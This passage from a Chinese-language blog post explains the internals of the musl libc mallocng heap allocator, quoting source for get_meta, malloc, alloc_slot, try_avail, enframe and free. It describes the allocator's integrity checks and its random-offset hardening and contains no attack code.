<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assert(!((<span class="type">uintptr_t</span>) p &amp; <span class="number">15</span>));</span><br><span class="line"><span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *) (p - <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> index = get_slot_index(p);</span><br><span class="line"><span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">    assert(!offset);</span><br><span class="line">    offset = *(<span class="type">uint32_t</span> *) (p - <span class="number">8</span>);</span><br><span class="line">    assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *) (p - UNIT * offset - UNIT);</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br></pre></td></tr></table></figure></div>

<p>之后对 <code>meta</code> 和 <code>chunk</code> 进行相关检查，防止伪造 chunk 。通过检查后返回得到的 <code>meta</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assert(meta-&gt;mem == base);</span><br><span class="line">assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span> &lt;&lt; index)));</span><br><span class="line">assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span> &lt;&lt; index)));</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *) ((<span class="type">uintptr_t</span>) meta &amp; <span class="number">-4096</span>);</span><br><span class="line">assert(area-&gt;check == ctx.secret);</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">    assert(offset &gt;= size_classes[meta-&gt;sizeclass] * index);</span><br><span class="line">    assert(offset &lt; size_classes[meta-&gt;sizeclass] * (index + <span class="number">1</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">    assert(offset &lt;= meta-&gt;maplen * <span class="number">4096UL</span> / UNIT - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> meta *) meta;</span><br></pre></td></tr></table></figure></div>

<h2 id="函数分析-1"><a href="#函数分析-1" class="headerlink" title="函数分析"></a>函数分析</h2><h3 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h3><p>首先检查申请的内存是否溢出。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>如果申请的内存大于 131052 字节则采用直接 mmap 的方式申请。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line">    <span class="type">size_t</span> needed = n + IB + UNIT;</span><br><span class="line">    <span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    wrlock();</span><br><span class="line">    step_seq();</span><br><span class="line">    g = alloc_meta();</span><br><span class="line">    <span class="keyword">if</span> (!g) &#123;</span><br><span class="line">        unlock();</span><br><span class="line">        munmap(p, needed);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g-&gt;mem = p;</span><br><span class="line">    g-&gt;mem-&gt;meta = g;</span><br><span class="line">    g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">    g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">    g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">    g-&gt;maplen = (needed + <span class="number">4095</span>) / <span class="number">4096</span>;</span><br><span class="line">    g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line">    <span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">    ctx.mmap_counter++;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>否则先计算出申请的内存大小所在的组并取出对应组的 deque 中 <code>ctx.active[sc]</code> 指向的那个 <code>meta</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc = size_to_class(n);</span><br><span class="line">rdlock();</span><br><span class="line">g = ctx.active[sc];</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>size_to_class</code> 定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    n = (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="type">int</span> i = (<span class="number">28</span> - a_clz_32(n)) * <span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i + <span class="number">1</span>]) i += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该代码等价于下面的 C++ 代码，只不过根据数据特性进行了复杂度的优化。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::lower_bound(size_classes, size_classes + <span class="number">48</span>, (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) - size_classes;</span><br></pre></td></tr></table></figure></div>

<p>对应组的 deque 为空则根据经验进行一些调整。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line"><span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line"><span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line"><span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line"><span class="keyword">if</span> (!g &amp;&amp; sc &gt;= <span class="number">4</span> &amp;&amp; sc &lt; <span class="number">32</span> &amp;&amp; sc != <span class="number">6</span> &amp;&amp; !(sc &amp; <span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">    <span class="type">size_t</span> usage = ctx.usage_by_class[sc | <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">    <span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">    <span class="keyword">if</span> (!ctx.active[sc | <span class="number">1</span>] || (!ctx.active[sc | <span class="number">1</span>]-&gt;avail_mask &amp;&amp; !ctx.active[sc | <span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">        usage += <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">        sc |= <span class="number">1</span>;</span><br><span class="line">    g = ctx.active[sc];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后从尝试在该 <code>meta</code> 中获取一个空闲 chunk 的下标，如果成功则更新 <code>avail_mask</code> 后直接跳转到 <code>success</code> 否则跳出循环。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">    first = mask &amp; -mask;</span><br><span class="line">    <span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">        g-&gt;avail_mask = mask - first;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask - first) != mask)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    idx = a_ctz_32(first);</span><br><span class="line">    <span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">upgradelock();</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>meta</code> 没有空闲 chunk 则调用 <code>alloc_slot</code> 获取一个有空闲 chunk 的 <code>meta</code> 然后让 <code>ctx.active</code> 对应的 deque 头指向这个 <code>meta</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">idx = alloc_slot(sc, n);</span><br><span class="line"><span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">g = ctx.active[sc];</span><br></pre></td></tr></table></figure></div>

<p>最后如果成功获取空闲 chunk 的下标则调用 <code>enframe</code> 函数将该 chunk 取出。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">success:</span><br><span class="line">    ctr = ctx.mmap_counter;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br></pre></td></tr></table></figure></div>

<h3 id="alloc-slot"><a href="#alloc-slot" class="headerlink" title="alloc_slot"></a>alloc_slot</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">    <span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">    <span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    g-&gt;avail_mask--;</span><br><span class="line">    <span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先调用 <code>try_avail</code> 获取一个有空闲 chunk 的 <code>meta</code> 然后让让 <code>ctx.active</code> 对应的 deque 头指向这个 <code>meta</code> ，否则调用 <code>alloc_group</code> 申请一个新的 <code>group</code> 并且将这个 <code>group</code> 对应的 <code>meta</code> 加入到 deque 中（此时 deque 中就这一个 <code>meta</code> 因此 <code>ctx.active</code> 对应的 deque 头指向这个 <code>meta</code> ）。</p>
<h3 id="try-avail"><a href="#try-avail" class="headerlink" title="try_avail"></a>try_avail</h3><p>首先如果 deque 为空则直接返回 0 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line"><span class="type">uint32_t</span> first;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>如果没有可用的 chunk 则尝试获取一个有可用 chunk 的 <code>meta</code> 并将它连到 deque 头，最后从其中获取一个下标最小的可用 chunk 更新 <code>avail_mask</code> 并返回下标。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line"><span class="keyword">if</span> (!mask) &#123;...&#125;</span><br><span class="line">first = mask &amp; -mask;</span><br><span class="line">m-&gt;avail_mask = mask - first;</span><br><span class="line"><span class="keyword">return</span> first;</span><br></pre></td></tr></table></figure></div>

<p>如果当前的 <code>meta</code> 既没有空闲的 chunk 也没有释放的 chunk 则直接将该 <code>meta</code> 从 deque 中取出。为了充分利用空闲的 chunk ，无论当前 <code>meta</code> 有没有释放的 chunk 都会将 deque 的头指向下一个 <code>meta</code> 。另外如果 deque 为空会返回 0 。如果是正常情况如果有下一个 <code>meta</code> 则下一个 <code>meta</code> 一定会有可用或释放的 chunk 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">    dequeue(pm, m);</span><br><span class="line">    m = *pm;</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    m = m-&gt;next;</span><br><span class="line">    *pm = m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果下一个 <code>meta</code> 全部都是释放的 chunk 那么本着充分利用空闲 chunk 的原则会将 deque 的头指向下一个 <code>meta</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mask = m-&gt;freed_mask;</span><br><span class="line"></span><br><span class="line"><span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line"><span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line"><span class="keyword">if</span> (mask == (<span class="number">2u</span> &lt;&lt; m-&gt;last_idx) - <span class="number">1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">    m = m-&gt;next;</span><br><span class="line">    *pm = m;</span><br><span class="line">    mask = m-&gt;freed_mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果当前 chunk 的 <code>active_idx</code> 范围内没有释放的 chunk 则尽可能选择下一个 chunk 否则根据经验扩大 <code>active_idx</code> 的范围，最后调用 <code>activate_group</code> 函数将 <code>active_idx</code> 范围内释放的 chunk 转换为空闲的 chunk。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">    <span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">    <span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">    <span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">    <span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span> &lt;&lt; m-&gt;mem-&gt;active_idx) - <span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> size = size_classes[m-&gt;sizeclass] * UNIT;</span><br><span class="line">            <span class="type">int</span> span = UNIT + size * cnt;</span><br><span class="line">            <span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">            <span class="keyword">while</span> ((span ^ (span + size - <span class="number">1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">                cnt++;</span><br><span class="line">                span += size;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cnt &gt; m-&gt;last_idx + <span class="number">1</span>)</span><br><span class="line">                cnt = m-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">            m-&gt;mem-&gt;active_idx = cnt - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mask = activate_group(m);</span><br><span class="line">    assert(mask);</span><br><span class="line">    decay_bounces(m-&gt;sizeclass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="enframe"><a href="#enframe" class="headerlink" title="enframe"></a>enframe</h3><p>首先计算出 chunk 的起始和结束地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line"><span class="type">size_t</span> slack = (stride - IB - n) / UNIT;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p = g-&gt;mem-&gt;storage + stride * idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = p + stride - IB;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>get_stride</code> 函数是计算出 <code>meta</code> 中 chunk 的大小。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_stride</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!g-&gt;last_idx &amp;&amp; g-&gt;maplen) &#123;</span><br><span class="line">        <span class="keyword">return</span> g-&gt;maplen * <span class="number">4096UL</span> - UNIT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UNIT * size_classes[g-&gt;sizeclass];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>为了增大利用难度，用户使用的内存区域会在原有 chunk 的位置后加一个随机的偏移 <code>off</code> ，这个随机值是通过 <code>ctr</code>（<code>ctx.mmap_counter</code>）， chunk 的 offset 以及剩余区域大小计算出来的。之后在原有 chunk 的 idx 字段打上 <code>7 &lt;&lt; 5</code> 标记，并且将 <code>p</code> 指针后移 <code>UNIT * off</code> 字节。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line"><span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line"><span class="type">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="type">uint16_t</span> *) (p - <span class="number">2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">assert(!p[<span class="number">-4</span>]);</span><br><span class="line"><span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line">    <span class="type">size_t</span> m = slack;</span><br><span class="line">    m |= m &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    m |= m &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    m |= m &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    off &amp;= m;</span><br><span class="line">    <span class="keyword">if</span> (off &gt; slack) off -= slack + <span class="number">1</span>;</span><br><span class="line">    assert(off &lt;= slack);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line">    <span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line">    <span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">    *(<span class="type">uint16_t</span> *) (p - <span class="number">2</span>) = off;</span><br><span class="line">    p[<span class="number">-3</span>] = <span class="number">7</span> &lt;&lt; <span class="number">5</span>;</span><br><span class="line">    p += UNIT * off;</span><br><span class="line">    <span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line">    <span class="comment">// byte, so make one.</span></span><br><span class="line">    p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后如下图所示设置相关字段信息。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/f685c9b70ab21e3f5373428a76c0b481.png"
                      alt="img"
                ></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_size</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">unsigned</span> <span class="type">char</span> *end, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> reserved = end - p - n;</span><br><span class="line">    <span class="keyword">if</span> (reserved) end[-reserved] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        *(<span class="type">uint32_t</span> *) (end - <span class="number">4</span>) = reserved;</span><br><span class="line">        end[<span class="number">-5</span>] = <span class="number">0</span>;</span><br><span class="line">        reserved = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p[<span class="number">-3</span>] = (p[<span class="number">-3</span>] &amp; <span class="number">31</span>) + (reserved &lt;&lt; <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint16_t</span> *) (p - <span class="number">2</span>) = (<span class="type">size_t</span>) (p - g-&gt;mem-&gt;storage) / UNIT;</span><br><span class="line">    p[<span class="number">-3</span>] = idx;</span><br><span class="line">    set_size(p, end, n);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></div>

<h3 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h3><p><code>p</code> 为空直接返回，否则获取 <code>chunk</code> 对应的 <code>meta</code> ，<code>index</code> 和 <code>group</code> 中 <code>chunk</code> 的大小，根据这些信息计算出 <code>chunk</code> 的起始和结束位置。 </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line"><span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line"><span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride * idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">get_nominal_size(p, end);</span><br><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; idx, all = (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>将 <code>chunk</code> 的 <code>index</code> 和 <code>flag</code> 一并置为 0xFF ，<code>offset</code> 置为 0 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">((<span class="type">unsigned</span> <span class="type">char</span> *) p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line"><span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line"><span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">*(<span class="type">uint16_t</span> *) ((<span class="type">char</span> *) p - <span class="number">2</span>) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>如果释放的 <code>chunk</code> 的起始和结束地址差至少 2 个内存页则释放的 <code>chunk</code> 必然包含一个内存页，因此将 <code>chunk</code> 包含的所有完整物理页调用 <code>madvise</code> 设置 <code>lazyfree</code> 标志，这样在内存紧缺的时候会回收这些物理页。</p>
